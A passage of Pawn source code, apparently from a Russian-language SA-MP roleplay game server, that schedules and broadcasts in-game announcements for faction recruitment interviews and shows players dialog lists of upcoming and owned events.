            {
                case 1: format(req,128,"паспорт, лицензия на вождение");
                case 2: format(req,128,"паспорт, лицензия на вождение и оружие");
                case 3: format(req,128,"паспорт, лицензия на вождение");
                case 4: format(req,128,"паспорт, лицензия на вождение");
                case 6: format(req,128,"паспорт, лицензия на вождение и оружие, военный билет");
                case 7: format(req,128,"паспорт, лицензия на вождение и оружие, военный билет");
                default: format(req,128,"паспорт");
            }
            new prefix[96]; Sob_FormatRankPrefix(g_sob_events[i_ev][ev_team], g_sob_events[i_ev][ev_rank], g_sob_events[i_ev][ev_owner], prefix, sizeof prefix);
            new msg[160];
            format(msg, sizeof msg, "%s: Уважаемые жители Нижегородской Области, минуточку внимания", prefix); SendClientMessageToAll(SOB_ANNOUNCE_COLOR, msg);
            switch(g_sob_events[i_ev][ev_team])
            {
                case 1: format(msg, sizeof msg, "%s: Собеседование в Правительство началось.", prefix);
                case 2: format(msg, sizeof msg, "%s: Собеседование в Мин. Обороны началось.", prefix);
                case 3: format(msg, sizeof msg, "%s: Собеседование в Мин. Здравоохранения началось.", prefix);
                case 4: format(msg, sizeof msg, "%s: Собеседование в ТРК `Ритм` началось.", prefix);
                case 6: format(msg, sizeof msg, "%s: Собеседование в Мин. Внутренних Дел началось.", prefix);
                case 7: format(msg, sizeof msg, "%s: Собеседование в ФСИН началось.", prefix);
                default: format(msg, sizeof msg, "%s: Собеседование началось.", prefix);
            }
            SendClientMessageToAll(SOB_ANNOUNCE_COLOR, msg);
            format(msg, sizeof msg, "%s: При себе иметь %s.", prefix, req); SendClientMessageToAll(SOB_ANNOUNCE_COLOR, msg);
        }

        if(now == g_sob_events[i_ev][ev_next_reminder_ts] && now < e)
        {
            new prefix[96]; Sob_FormatRankPrefix(g_sob_events[i_ev][ev_team], g_sob_events[i_ev][ev_rank], g_sob_events[i_ev][ev_owner], prefix, sizeof prefix);
            static msg[160];
            switch(g_sob_events[i_ev][ev_team])
            {
                case 1: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в Правительство.", prefix);
                case 2: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в Мин. Обороны.", prefix);
                case 3: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в Мин. Здравоохранения.", prefix);
                case 4: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в ТРК `Ритм`.", prefix);
                case 6: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в Мин. Внутренних Дел.", prefix);
                case 7: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование в ФСИН.", prefix);
                default: format(msg, sizeof msg, "%s: Напоминаю, что проходит собеседование.", prefix);
            }
            SendClientMessageToAll(SOB_ANNOUNCE_COLOR, msg);
            g_sob_events[i_ev][ev_next_reminder_ts] += 1800;
        }

        if(!g_sob_events[i_ev][ev_end_announced] && now == e)
        {
            g_sob_events[i_ev][ev_end_announced] = true;
            new prefix2[96]; Sob_FormatRankPrefix(g_sob_events[i_ev][ev_team], g_sob_events[i_ev][ev_rank], g_sob_events[i_ev][ev_owner], prefix2, sizeof prefix2);
            static msg2[160];
            switch(g_sob_events[i_ev][ev_team])
            {
                case 1: format(msg2, sizeof msg2, "%s: Собеседование в Правительство закончено.", prefix2);
                case 2: format(msg2, sizeof msg2, "%s: Собеседование в Мин. Обороны закончено.", prefix2);
                case 3: format(msg2, sizeof msg2, "%s: Собеседование в Мин. Здравоохранения закончено.", prefix2);
                case 4: format(msg2, sizeof msg2, "%s: Собеседование в ТРК `Ритм` закончено.", prefix2);
                case 6: format(msg2, sizeof msg2, "%s: Собеседование в Мин. Внутренних Дел закончено.", prefix2);
                case 7: format(msg2, sizeof msg2, "%s: Собеседование в ФСИН закончено.", prefix2);
                default: format(msg2, sizeof msg2, "%s: Собеседование завершено.", prefix2);
            }
            SendClientMessageToAll(SOB_ANNOUNCE_COLOR, msg2);
        }
    }
    return 1;
}

public Sob_AnnounceAlign()
{
    Sob_AnnounceTick();
    SetTimer("Sob_AnnounceTick", 60000, true);
    return 1;
}

stock Sob_BuildUpcoming(playerid)
{
    g_sob_tmp_count[playerid] = 0;
    new hour, minute, second;
    gettime(hour, minute, second);
    new nowsec = hour * 3600 + minute * 60 + second;
    for(new i = 0; i < SOB_MAX_SCHEDULES; i++)
    {
        new s = g_sob_container_hours[i] * 3600;
        new e = s + 1800;
        if(nowsec < s && g_sob_tmp_count[playerid] < SOB_MAX_LIST)
        {
            new idx = g_sob_tmp_count[playerid]++;
            g_sob_tmp_type[playerid][idx] = 1;
            g_sob_tmp_start_sec[playerid][idx] = s;
            g_sob_tmp_end_sec[playerid][idx] = e;
        }
        new dh = g_sob_dump_hours[i];
        new ds = (dh == 0 ? 24 : dh) * 3600;
        new de = ds + 1800;
        if(nowsec < ds && g_sob_tmp_count[playerid] < SOB_MAX_LIST)
        {
            new idx2 = g_sob_tmp_count[playerid]++;
            g_sob_tmp_type[playerid][idx2] = 2;
            g_sob_tmp_start_sec[playerid][idx2] = ds;
            g_sob_tmp_end_sec[playerid][idx2] = de;
        }
    }
    for(new a = 0; a < g_sob_tmp_count[playerid]; a++)
    {
        for(new b = a + 1; b < g_sob_tmp_count[playerid]; b++)
        {
            if(g_sob_tmp_start_sec[playerid][a] > g_sob_tmp_start_sec[playerid][b])
            {
                new ttype = g_sob_tmp_type[playerid][a];
                new ts = g_sob_tmp_start_sec[playerid][a];
                new te = g_sob_tmp_end_sec[playerid][a];
                g_sob_tmp_type[playerid][a] = g_sob_tmp_type[playerid][b];
                g_sob_tmp_start_sec[playerid][a] = g_sob_tmp_start_sec[playerid][b];
                g_sob_tmp_end_sec[playerid][a] = g_sob_tmp_end_sec[playerid][b];
                g_sob_tmp_type[playerid][b] = ttype;
                g_sob_tmp_start_sec[playerid][b] = ts;
                g_sob_tmp_end_sec[playerid][b] = te;
            }
        }
    }
    return 1;
}

stock Sob_ShowInterviewsList(playerid)
{
    new now = gettime();
    static body[2048];
    strcat(body, "Название\tОписание\tМесто\tВремя\n");
    new count = 0;
    g_sob_int_count[playerid] = 0;
    for(new i=0;i<SOB_MAX_EVENTS;i++) if(g_sob_events[i][ev_used] && g_sob_events[i][ev_type]==1 && g_sob_events[i][ev_end_ts] > now)
    {
        new row[192];
        new sh, sm, eh, em;
        Sob_ExtractMskHM(g_sob_events[i][ev_start_ts], sh, sm);
        Sob_ExtractMskHM(g_sob_events[i][ev_end_ts], eh, em);
        format(row, sizeof row, "Собеседование в %s\t%s\t%s\t%02d:%02d - %02d:%02d (MSK)\n", g_sob_events[i][ev_place], g_sob_events[i][ev_desc], g_sob_events[i][ev_place], sh, sm, eh, em);
        strcat(body, row);
        count++;
        g_sob_int_map[playerid][g_sob_int_count[playerid]++] = i;
    }
    if(count == 0)
    {
        SendClientMessage(playerid, 0xCECECEFF, "Список собеседований пуст.");
        return 1;
    }
    SetPVarInt(playerid, "SOB_STAGE", 30);
    Dialog(playerid, DIALOG_SOB_INTERVIEWS_LIST, DIALOG_STYLE_TABLIST_HEADERS, "Собеседования", body, "Выбрать", "Назад");
    return 1;
}

stock Sob_ShowMyEventsList(playerid)
{
    new now = gettime();
    static body[2048];
    strcat(body, "Название\tОписание\tМесто\tВремя\n");
    new name[24]; format(name, sizeof name, "%s", GetPlayerNameEx(playerid));
    new count=0;
    g_sob_my_count[playerid] = 0;
    for(new i=0;i<SOB_MAX_EVENTS;i++) if(g_sob_events[i][ev_used] && strcmp(g_sob_events[i][ev_owner], name, true)==0 && g_sob_events[i][ev_end_ts] > now)
    {
        new row[192];
        new sh, sm, eh, em;
        Sob_ExtractMskHM(g_sob_events[i][ev_start_ts], sh, sm);
        Sob_ExtractMskHM(g_sob_events[i][ev_end_ts], eh, em);
        format(row, sizeof row, "Собеседование в %s\t%s\t%s\t%02d:%02d - %02d:%02d (MSK)\n", g_sob_events[i][ev_place], g_sob_events[i][ev_desc], g_sob_events[i][ev_place], sh, sm, eh, em);
        strcat(body, row);
        count++;
        g_sob_my_map[playerid][g_sob_my_count[playerid]++] = i;
    }
    if(count==0) strcat(body, "Нет событий\t-\t-\t-\n");
    SetPVarInt(playerid, "SOB_STAGE", 20);
    Dialog(playerid, DIALOG_SOB_MY_EVENTS_LIST, DIALOG_STYLE_TABLIST_HEADERS, "Мои события", body, "Выбрать", "Назад");
    return 1;
}
